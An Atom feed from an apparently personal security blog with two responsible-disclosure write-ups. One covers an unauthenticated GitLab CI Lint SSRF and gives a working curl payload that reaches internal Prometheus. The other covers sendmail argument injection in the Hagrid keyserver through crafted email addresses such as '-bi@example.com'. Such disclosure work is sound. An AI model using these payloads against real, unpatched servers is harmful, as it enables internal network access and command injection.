<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://vin01.github.io/piptagole/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/piptagole/" rel="alternate" type="text/html" /><updated>2022-01-13T20:39:17+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Unauthenticated Gitlab SSRF</title><link href="https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html" rel="alternate" type="text/html" title="Unauthenticated Gitlab SSRF" /><published>2021-06-15T10:29:00+00:00</published><updated>2021-06-15T10:29:00+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf</id><content type="html" xml:base="https://vin01.github.io/piptagole/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html">&lt;h3 id=&quot;meet-gitlab-ci-lint-api&quot;&gt;Meet Gitlab &lt;a href=&quot;https://docs.gitlab.com/ee/api/lint.html&quot;&gt;CI Lint API&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Purpose of the CI Lint API is to validate CI/CD YAML configuration for Gitlab.&lt;/p&gt;

&lt;p&gt;A usual request to this API would validate YAML payload and provide the result accordingly.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;--header&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Content-Type: application/json&quot;&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;https://gitlab.example.com/api/v4/ci/lint&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{&quot;content&quot;: &quot;{ \&quot;image\&quot;: \&quot;ruby:2.6\&quot;, \&quot;services\&quot;: [\&quot;postgres\&quot;], \&quot;before_script\&quot;: [\&quot;bundle install\&quot;, \&quot;bundle exec rake db:create\&quot;], \&quot;variables\&quot;: {\&quot;DB_NAME\&quot;: \&quot;postgres\&quot;}, \&quot;types\&quot;: [\&quot;test\&quot;, \&quot;deploy\&quot;, \&quot;notify\&quot;], \&quot;rspec\&quot;: { \&quot;script\&quot;: \&quot;rake spec\&quot;, \&quot;tags\&quot;: [\&quot;ruby\&quot;, \&quot;postgres\&quot;], \&quot;only\&quot;: [\&quot;branches\&quot;]}}&quot;}&apos;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;valid&quot;&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;errors&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;,
  &lt;span class=&quot;s2&quot;&gt;&quot;warnings&quot;&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;em&gt;Note: prior to this patch, this endpoint did not require any authentication&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;meet-remote-yaml-includes-in-gitlab-ci-configuration-files&quot;&gt;Meet &lt;a href=&quot;https://docs.gitlab.com/ee/ci/yaml/includes.html#single-string-or-array-of-multiple-values&quot;&gt;Remote YAML includes&lt;/a&gt; in Gitlab Ci configuration files&lt;/h3&gt;

&lt;p&gt;CI configuration files for Gitlab are YAML and can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; tag to include YAML templates from remote URLs.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;include:
  - &lt;span class=&quot;s1&quot;&gt;&apos;https://gitlab.com/awesome-project/raw/main/.before-script-template.yml&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;ssrf&quot;&gt;SSRF!&lt;/h3&gt;

&lt;p&gt;If you haven’t already figured, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; can also point to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.1.1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt; ..&lt;/p&gt;

&lt;p&gt;SSRF proof-of-concept to dump Prometheus targets from the Prometheus API by abusing this vulnerability.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--show-error&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Content-Type: application/json&apos;&lt;/span&gt; https://gitlab.example.com/api/v4/ci/lint &lt;span class=&quot;nt&quot;&gt;--data&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{ &quot;include_merged_yaml&quot;: true, &quot;content&quot;: &quot;include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml&quot; }&apos;&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;invalid&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;errors&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;jobs status config should implement a script: or a trigger: keyword&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;jobs data config should implement a script: or a trigger: keyword&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;jobs config should contain at least one visible job&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;warnings&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;merged_yaml&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;status: success&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;data:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  activeTargets:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  - discoveredLabels:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;      __address__: ...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;em&gt;Note: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.yml&lt;/code&gt; is essential part of the paylaod becauyse API expects &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.yml&lt;/code&gt; extension for validation of remote YAML file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;This is only exploitable if &lt;a href=&quot;https://docs.gitlab.com/ee/security/webhooks.html&quot;&gt;internal network requests are enabled&lt;/a&gt; in Gitlab (they are disabled by default). It turns out to be a quite widely enabled option though, as internal requests are useful for webhooks, CI operations.&lt;/p&gt;

&lt;h3 id=&quot;disclosure-impact-and-remediation&quot;&gt;Disclosure, impact and remediation&lt;/h3&gt;

&lt;p&gt;I disclosed it in December 2020 and first patch was out in &lt;a href=&quot;https://about.gitlab.com/releases/2021/02/11/security-release-gitlab-13-8-4-released/&quot;&gt;February 2021&lt;/a&gt;, second complete patch followed in &lt;a href=&quot;https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/&quot;&gt;June&lt;/a&gt; recently. Gitlab team was very supportive and responsive as always ❤️  Thank you for the bounties and swag &lt;a href=&quot;https://twitter.com/gitlab&quot;&gt;Team Gitlab&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Wide use of the unauthenticated CI Lint API also led to a lot of workflows being &lt;a href=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/321290&quot;&gt;disrupted&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I have also disclosed it directly to &lt;strong&gt;many&lt;/strong&gt; affected organizations (universities, open source projects, governments) but vulnerable public facing instances are still out there. I did not initially intend to blog it, but looking at the number of affected instances, I think it might help spread the word.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: Patches before December 2021 (version 14.5.2) did not prevent attacks from &lt;a href=&quot;https://docs.gitlab.com/ee/user/permissions.html#external-users&quot;&gt;external Gitlab users&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please apply latest gitlab security updates ASAP!&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><category term="gitlab" /><category term="ssrf" /><category term="security" /><summary type="html">Meet Gitlab CI Lint API</summary></entry><entry><title type="html">Argument injection in Hagrid keyserver</title><link href="https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html" rel="alternate" type="text/html" title="Argument injection in Hagrid keyserver" /><published>2021-06-15T10:29:00+00:00</published><updated>2021-06-15T10:29:00+00:00</updated><id>https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection</id><content type="html" xml:base="https://vin01.github.io/piptagole/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html">&lt;h3 id=&quot;what-is-hagrid-&quot;&gt;What is Hagrid ?&lt;/h3&gt;

&lt;p&gt;Hagrid as in, “keeper of keys” is a verifying OpenPGP keyserver, written in Rust, powered by &lt;a href=&quot;https://sequoia-pgp.org/&quot;&gt;Sequoia-PGP&lt;/a&gt; running on &lt;a href=&quot;https://keys.openpgp.org&quot;&gt;https://keys.openpgp.org&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It was &lt;a href=&quot;https://keys.openpgp.org/about/news#2019-06-12-launch&quot;&gt;launched&lt;/a&gt; on 12 June 2019.&lt;/p&gt;

&lt;p&gt;It is supposed to replace &lt;a href=&quot;https://unix.stackexchange.com/questions/656205/sks-keyservers-gone-what-to-use-instead&quot;&gt;SKS key server&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;digging-deeper&quot;&gt;Digging deeper&lt;/h3&gt;

&lt;p&gt;I wanted to take a closer look to find potential security flaws. A key feature potentially with lot of room for vulnerabilities was emali verification. Hagrid supports verifying user IDs with email verification by following a link sent to user’s email address.&lt;/p&gt;

&lt;p&gt;Hagrid uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; for mailing.&lt;/p&gt;

&lt;p&gt;I also tested &lt;a href=&quot;https://marlam.de/msmtp/&quot;&gt;msmtp&lt;/a&gt; which can be used as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; replacement for Hagrid integration.&lt;/p&gt;

&lt;h3 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h3&gt;

&lt;p&gt;Hagrid uses &lt;a href=&quot;https://github.com/lettre/lettre&quot;&gt;lettre&lt;/a&gt; mailing library.&lt;/p&gt;

&lt;p&gt;By crafting email addresses like following, it was possible to make &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lettre&lt;/code&gt; inject arbitrary flags into final &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt; command.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-bi@example.com    (-bi: Initialize the alias database.)
-d0.1a@example.com (The option -d0.1 prints the version of sendmail and the options it was compiled with.)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Strace dump from the server running injected sendmail flags:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;28329 execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-i&quot;, &quot;-f&quot;, &quot;noreply@localhost&quot;, &quot;-bi@example.com&quot;], 0x7ffcc8ada608 /* 23 vars */ &amp;lt;unfinished ...&amp;gt;
28329 sendto(3, &quot;&amp;lt;17&amp;gt;Nov  4 16:48:22 sendmail[28329]: user 1000 attempted to rebuild the alias map&quot;, 81, MSG_NOSIGNAL, NULL, 0) = 81
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A simple fix was to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendmail&lt;/code&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--&lt;/code&gt; flag to treat argument &lt;em&gt;only&lt;/em&gt; as an email address.&lt;/p&gt;

&lt;p&gt;From &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;man&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--  Stop processing command flags and use the rest of the arguments as addresses. 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;disclosure-impact-and-remediation&quot;&gt;Disclosure, impact and remediation&lt;/h3&gt;

&lt;p&gt;I disaclosed it to both Hagrid and Lettre maintainrs who weree very fast in thwir response. (5 Nov. 2020)&lt;/p&gt;

&lt;p&gt;Vincent applied the hotfix to Hagrid &lt;a href=&quot;https://gitlab.com/hagrid-keyserver/hagrid/-/commit/612b58dd595f42c15e6d406cf7e8e030c8461f01&quot;&gt;on the same day&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/lettre/lettre/security/advisories/GHSA-vc2p-r46x-m3vx&quot;&gt;Advisory&lt;/a&gt; from lettre within a week.&lt;/p&gt;

&lt;p&gt;It was assigned &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28247&quot;&gt;CVE-2020-28247&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><category term="pgp" /><category term="security" /><category term="hagrid" /><summary type="html">What is Hagrid ?</summary></entry></feed>